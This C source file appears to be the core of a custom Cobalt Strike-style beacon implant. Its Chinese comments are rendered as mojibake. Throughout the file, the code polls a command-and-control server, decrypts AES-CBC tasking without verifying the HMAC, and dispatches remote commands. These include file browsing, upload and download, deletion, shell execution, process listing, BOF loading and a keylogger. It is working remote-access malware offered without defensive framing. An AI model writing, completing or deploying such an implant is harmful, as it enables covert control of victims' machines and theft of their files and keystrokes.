#include <shobjidl.h>
#include "MetaData.h"
#include "Util.h"
#include "Http.h"
#pragma warning(disable:4996)
#include "Config.h"
#include "Command.h"
#include "Job.h"
#include <tlhelp32.h>
#include <tchar.h>

// ��������
extern int SleepTime;
extern unsigned char AESRandaeskey[16];
extern unsigned char Hmackey[16];
extern int clientID;

VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen);

VOID beacon_main() {
    // Cookie: SESSIONID = Metadata
    wchar_t* cookie_header = makeMetaData();
    while (1) {
        // ����������ͬʱ����ȡ��Ӧ����
        size_t responseSize = 0;
        unsigned char* responseEncodeData = GET(cookie_header, &responseSize);

        size_t responseDataLength = 0;

        // �����������Ҫ����һ�� NetBios ���룬һ�� XOR ���ܶ�Ӧ Mask����Ϊ profile ����д��
        unsigned char* responseData = parseGetResponse(responseEncodeData, responseSize, &responseDataLength);

        if (responseDataLength > 16 && responseDataLength % 16 == 0) {
            // ֱ��ȥ�� HMAC Hash�����ﻹû��δʵ�� Hash У��
            size_t dataLength = responseDataLength;
            size_t middleDataLength = dataLength - 16; 

            // ��ʼ����ָ��(AES CBC)
            unsigned char* key = AESRandaeskey;

            size_t ivLength = strlen((char*)IV);
            size_t decryptAES_CBCdatalen;
            unsigned char* decryptAES_CBCdata = AesCBCDecrypt(responseData, key, middleDataLength, &decryptAES_CBCdatalen);

            if (decryptAES_CBCdata != NULL) {
				// �����ĸ��ֽڣ�
                unsigned char* lenBytesStart = decryptAES_CBCdata + 4;
                uint8_t lenBytes[4];
                memcpy(lenBytes, lenBytesStart, 4);

                // ���ĸ��ֽ�������ָ���ܳ���
                uint32_t bigEndianLenBytes = bigEndianUint32(lenBytes);     
                // ָ�����ݣ����ж���ָ�����ʱ�ṹ����
                // ָ�����ݰ���ʽ��cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(commandLen Bytes) || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
                // commandLen ֻ�� commandBuf �ĳ���
                unsigned char* decryptedBuf = decryptAES_CBCdata + 8;       

                // ָ�����ݴ�С����
                size_t executeCount = 0;

                while (1) {
                    // ָ���������
                    if (bigEndianLenBytes <= 0) {
                        break;
                    }

                    int callbackType = 0;

                    // ���������������������ݰ��������ֶ�
                    uint32_t commandType = 0;
                    size_t commandBuflen = 0;
                    unsigned char* commandBuf = NULL;

                    // ÿ����һ��ָ�� bigEndianLenBytes �����һ����Ӧָ��ĳ���
                    commandBuf = parsePacket(decryptedBuf, &bigEndianLenBytes, &commandType, &commandBuflen, &executeCount);

                    executeCommand(commandBuf, commandType, commandBuflen);
                }

                // һ�������ȡ��ȫ��ָ����Ѿ�ִ����� ��ʼ free
                free(decryptAES_CBCdata);
                decryptAES_CBCdata = NULL;
            }
        }
        Sleep(SleepTime);
    }
    free(cookie_header);
}

int main() {
    beacon_main();
    return 0;
}

 VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen) {
    unsigned char* postMsg = NULL;  // �˲������� DataProcess
    size_t msgLength = 0;           // �˲������� DataProcess
    int callbackType = 0;           // �˲������� DataProcess ����ʹ�� DWORD ��ʾ �����з��� 

    switch (commandType)
    {
    case CMD_TYPE_SLEEP:         // 1
        CmdChangSleepTimes(commandBuf);
        break;
    case CMD_TYPE_FILE_BROWSE:   // 1
        callbackType = 22;
        postMsg = CmdFileBrowse(commandBuf, &msgLength);
        break;
    case CMD_TYPE_UPLOAD_START:  // 0
        postMsg = CmdUpload(commandBuf, &commandBuflen, &msgLength, 1);
        callbackType = -1;
        break;
    case CMD_TYPE_UPLOAD_LOOP:   // 0
        postMsg = CmdUpload(commandBuf, &commandBuflen, &msgLength, 2);
        callbackType = -1;
        break;
    case  CMD_TYPE_DRIVES:       // 1
        callbackType = 22;
        postMsg = CmdDrives(commandBuf, &msgLength);
        break;
    case  CMD_TYPE_MKDIR: // 1 
        callbackType = 0;
        postMsg = CmdMkdir(commandBuf, &commandBuflen, &msgLength);
        break;
    case CMD_TYPE_PWD:    // 1
        callbackType = 0;
        postMsg = CmdPwd(commandBuf, &msgLength);
        break;
    case CMD_TYPE_GETUID: //1
        callbackType = 0;
        postMsg = CmdGetUid(commandBuf, &msgLength);
        break;
    case CMD_TYPE_RM:     // 1
        callbackType = 0;
        postMsg = CmdFileRemove(commandBuf, &commandBuflen, &msgLength);
        break;
    case CMD_TYPE_DOWNLOAD: // 1
        callbackType = 0;
        postMsg = CmdFileDownload(commandBuf, &commandBuflen, &msgLength);
        break;
    case CMD_TYPE_SHELL:
        callbackType = 0;
        CmdShell(commandBuf, &commandBuflen);
		// commanfBuf��ֵΪNULL�����ڴ˷�֧��Ӧ���������̸߳���free commanfBuf
		// ��Ϊ CmdShell �лᴴ���̣߳��߳��л�ʹ�� commanfBuf
		// �߳̽�������Զ��ͷ� commanfBuf
		// �����ǰ�ͷ� commanfBuf �ᵼ���̷߳������ͷ��ڴ�
        //commandBuf = NULL;
        break;
    case CMD_TYPE_Jobs:
        callbackType = -1;
        beacon_jobs();
        break;
    case CMD_TYPE_Jobskill:
        callbackType = -1;
        beacon_JobKill(commandBuf, &msgLength);;
        break;
    case CMD_TYPE_BOF:  // 1
        callbackType = -1;
        CmdBeaconBof(commandBuf, &commandBuflen);
        break;
    case CMD_TYPE_EXIT: // 1
        exit(-1);
    case CMD_TYPE_PIPE:
        callbackType = -1;
        PipeJob(commandBuf, &commandBuflen, &msgLength);
        break;
    case CMD_TYPE_PS:  // 1
        callbackType = -1;
        CmdPs(commandBuf, &commandBuflen);
        break;
    case CMD_TYPE_SPAWN_X64:
        callbackType = -1;
        exit(-1);
        break;
    case CMD_TYPE_KEYLOGGER:
        callbackType = -1;
        KEYLOGGEJob(0, commandBuf, &commandBuflen, 1);
        break;
    default:
        callbackType = 0;
        unsigned char* result = "[-] This Command Not Accomplish";
        unsigned char* resultMemmory = (unsigned char*)malloc(strlen(result) + 1);
        if (!resultMemmory) {
            fprintf(stderr, "Memory allocation failed for resultMemmory\n");
            return;
        }
        memcpy(resultMemmory, result, strlen(result));
        postMsg = resultMemmory;
        msgLength = strlen(result);
        break;
    }

 //   if(commandBuf != NULL) {
 //       free(commandBuf);
	//}
    free(commandBuf);

    if (callbackType >= 0 && postMsg) {
        DataProcess(postMsg, msgLength, callbackType);
        free(postMsg);
    }
}
